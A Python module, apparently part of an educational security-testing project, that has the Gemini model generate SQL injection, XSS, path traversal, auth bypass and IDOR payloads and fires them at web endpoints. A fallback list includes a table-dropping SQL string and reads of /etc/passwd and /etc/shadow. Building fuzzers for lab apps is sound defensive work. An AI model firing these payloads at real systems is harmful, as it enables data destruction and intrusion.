"""
ATTACKER AGENT
──────────────
Uses Gemini AI (free) to generate context-aware payloads for each endpoint,
then fires them using requests and records the raw responses.

This is the "AI brain" of the attack phase.
"""

import json
import time
import re
import requests

from security_system.ai_client import call_ai
from security_system.models import Endpoint, PayloadResult
from security_system.config import MAX_PAYLOADS_PER_PARAM


# Static fallback payloads used if the Gemini call fails
FALLBACK_PAYLOADS = {
    "sqli": [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "admin' --",
        "' UNION SELECT NULL --",
        "1; DROP TABLE users --",
        "' OR 1=1 --",
    ],
    "xss": [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "'\"><script>alert('XSS')</script>",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../../etc/shadow",
        "../vulnerable_app/database.py",
        "%2e%2e%2fetc%2fpasswd",
    ],
    "auth_bypass": [
        "admin",
        "administrator",
        "root",
        "guest",
        "test",
    ],
    "idor": [
        "1", "2", "3", "0", "99", "100", "-1",
    ],
}


class AttackerAgent:
    """
    Generates and fires attack payloads against discovered endpoints.

    For each endpoint + parameter, it asks Gemini:
      "What payloads would you try here?"
    Then fires each payload and records the response.
    """

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "SecurityTestBot/1.0 (educational)"})

    # ── Public ────────────────────────────────────────────────────────────────
    def run(self, endpoints: list[Endpoint]) -> list[PayloadResult]:
        """
        For each endpoint, generate payloads with Gemini, fire them,
        and return all raw results.
        """
        all_results: list[PayloadResult] = []

        for ep in endpoints:
            print(f"\n[ATTACKER] Testing: {ep.method} {ep.url}")

            targets = self._get_fuzz_targets(ep)

            for param, location in targets:
                print(f"[ATTACKER]   Parameter: '{param}' ({location})")

                payloads = self._generate_payloads(ep, param, location)

                for payload_info in payloads:
                    result = self._fire_payload(ep, param, location, payload_info)
                    if result:
                        all_results.append(result)
                        time.sleep(0.1)

        print(f"\n[ATTACKER] Done. Fired {len(all_results)} payloads total.\n")
        return all_results

    # ── Private ───────────────────────────────────────────────────────────────
    def _get_fuzz_targets(self, ep: Endpoint) -> list[tuple[str, str]]:
        """Returns list of (param_name, location) pairs to fuzz."""
        targets = []

        for p in ep.params:
            targets.append((p, "query"))

        for f in ep.form_fields:
            targets.append((f, "form"))

        if re.search(r"/\d+", ep.url):
            targets.append(("id", "path"))

        # If nothing found, guess based on URL pattern
        if not targets:
            if "/files" in ep.url:
                targets.append(("filename", "query"))
            elif "/login" in ep.url:
                targets.append(("username", "form"))
                targets.append(("password", "form"))
            elif "/search" in ep.url:
                targets.append(("q", "query"))
            elif "/comments" in ep.url:
                targets.append(("comment", "form"))
                targets.append(("username", "form"))

        return targets

    def _generate_payloads(self, ep: Endpoint, param: str, location: str) -> list[dict]:
        """
        Ask Gemini to generate payloads for this endpoint + param.
        Returns list of {"payload": "...", "type": "..."} dicts.
        """
        prompt = f"""You are a security testing assistant for an educational project.
The target is a deliberately vulnerable demo app running LOCALLY for learning.

Endpoint:
- URL: {ep.url}
- Method: {ep.method}
- Parameter name: {param}
- Parameter location: {location}
- Description: {ep.description}

Generate exactly {MAX_PAYLOADS_PER_PARAM} test payloads for this parameter.
Choose the right type based on context:
- sqli = SQL injection (login forms, search, DB lookups)
- xss = Cross-site scripting (any text rendered back to user)
- path_traversal = Path traversal (file/filename parameters)
- auth_bypass = Auth bypass (username/password fields)
- idor = Insecure Direct Object Reference (numeric ID params)

Return ONLY a raw JSON array — no markdown, no explanation, no code fences:
[
  {{"payload": "payload_here", "type": "sqli"}},
  {{"payload": "another_one", "type": "xss"}}
]"""

        try:
            raw = call_ai(prompt, max_tokens=1024)
            raw = raw.replace("```json", "").replace("```", "").strip()
            payloads = json.loads(raw)
            print(f"[ATTACKER]   Gemini generated {len(payloads)} payloads for '{param}'")
            return payloads
        except Exception as e:
            print(f"[ATTACKER]   ⚠ Gemini error ({e}) — using fallback payloads")
            return self._get_fallback_payloads(ep, param)

    def _get_fallback_payloads(self, ep: Endpoint, param: str) -> list[dict]:
        """Static fallback payloads when Gemini is unavailable."""
        results = []
        if "file" in param.lower():
            for p in FALLBACK_PAYLOADS["path_traversal"][:MAX_PAYLOADS_PER_PARAM]:
                results.append({"payload": p, "type": "path_traversal"})
        elif param == "username":
            for p in FALLBACK_PAYLOADS["sqli"][:3]:
                results.append({"payload": p, "type": "sqli"})
            for p in FALLBACK_PAYLOADS["auth_bypass"][:2]:
                results.append({"payload": p, "type": "auth_bypass"})
        elif param in ("q", "search", "query", "comment"):
            for p in FALLBACK_PAYLOADS["xss"][:3]:
                results.append({"payload": p, "type": "xss"})
            for p in FALLBACK_PAYLOADS["sqli"][:2]:
                results.append({"payload": p, "type": "sqli"})
        else:
            for p in FALLBACK_PAYLOADS["sqli"][:MAX_PAYLOADS_PER_PARAM]:
                results.append({"payload": p, "type": "sqli"})
        return results

    def _fire_payload(
        self,
        ep: Endpoint,
        param: str,
        location: str,
        payload_info: dict,
    ) -> PayloadResult | None:
        """Fire one payload and record the HTTP response."""
        payload      = payload_info.get("payload", "")
        payload_type = payload_info.get("type", "unknown")

        print(f"[ATTACKER]     → [{payload_type}] {repr(payload[:50])}")

        start = time.time()
        try:
            if location == "query":
                resp = self.session.get(
                    ep.url,
                    params={param: payload},
                    timeout=5,
                    allow_redirects=True,
                )
            elif location == "form":
                form_data = {f: "testvalue" for f in ep.form_fields}
                form_data[param] = payload
                resp = self.session.post(ep.url, data=form_data, timeout=5, allow_redirects=True)
            elif location == "path":
                url = re.sub(r"/\d+$", f"/{payload}", ep.url)
                resp = self.session.get(url, timeout=5, allow_redirects=True)
            else:
                return None

            elapsed = (time.time() - start) * 1000

            return PayloadResult(
                endpoint         = ep.url,
                method           = ep.method if location != "form" else "POST",
                parameter        = param,
                payload          = payload,
                payload_type     = payload_type,
                response_status  = resp.status_code,
                response_body    = resp.text[:3000],
                response_time_ms = round(elapsed, 2),
            )

        except requests.RequestException as e:
            print(f"[ATTACKER]     ✗ Request failed: {e}")
            return None